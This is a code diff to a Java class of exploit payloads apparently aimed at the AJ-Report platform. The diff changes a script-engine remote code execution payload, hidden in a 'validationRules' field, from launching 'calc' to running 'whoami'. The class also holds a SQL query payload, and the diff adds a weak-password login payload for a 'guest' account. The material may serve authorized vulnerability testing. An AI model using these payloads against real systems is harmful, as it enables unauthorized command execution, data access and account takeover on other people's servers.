@@ -16,7 +16,7 @@ public class AjReportPayload {
             "        {\n" +
             "            \"paramType\": \"\",\n" +
             "            \"paramDesc\": \"\",\n" +
-            "            \"validationRules\": \"function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\\\"js\\\").eval(\\\"new java.lang.ProcessBuilder('calc').start().getInputStream();\\\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}\",\n" +
+            "            \"validationRules\": \"function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\\\"js\\\").eval(\\\"new java.lang.ProcessBuilder('whoami').start().getInputStream();\\\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}\",\n" +
             "            \"paramName\": \"\",\n" +
             "            \"mandatory\": true,\n" +
             "            \"sampleItem\": \"\",\n" +
@@ -33,4 +33,6 @@ public class AjReportPayload {
             "    \"dynSentence\": \"{\\\"apiUrl\\\":\\\"http://127.0.0.1:9095/dataSet/testTransform\\\",\\\"method\\\":\\\"GET\\\",\\\"header\\\":\\\"{\\\\\\\"Content-Type\\\\\\\":\\\\\\\"application/json;charset=UTF-8\\\\\\\"}\\\",\\\"body\\\":\\\"\\\"}\"\n" +
             "}";
     public final static String SQL_EXP = "{\"sourceCode\":\"utf_8\",\"dynSentence\":\"show DATABASES\",\"dataSetParamDtoList\":[\n],\"dataSetTransformDtoList\":[],\"setType\":\"sql\"}";
+
+    public final static String WEAK_PASSWORD = "{\"loginName\":\"guest\",\"password\":\"dc29b42fb47b6b022eae7cf8e62b2538\",\"verifyCode\":\"\"}";
 }
